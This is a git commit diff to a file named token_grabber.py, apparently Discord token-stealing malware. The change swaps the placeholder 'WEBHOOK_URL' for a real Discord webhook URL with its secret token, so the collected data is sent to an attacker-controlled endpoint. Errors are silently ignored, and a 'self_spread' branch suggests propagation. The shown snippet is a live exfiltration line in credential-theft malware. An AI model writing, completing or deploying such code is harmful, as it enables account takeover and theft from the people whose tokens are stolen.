cdc9c0568973424d8b518ad705b30f95972a2192
CLANCyGILROY-png <dimatteoriccardo.wf72@gmail.com>
2024-07-14 21:11:50 +0200

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1262116832865816636/fKtw-DOztnuJup8F3f4AGxe3pSKH04RrJTGyT9IUzBsLWb6wOTW8sQl7utySkJaoQqoR", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
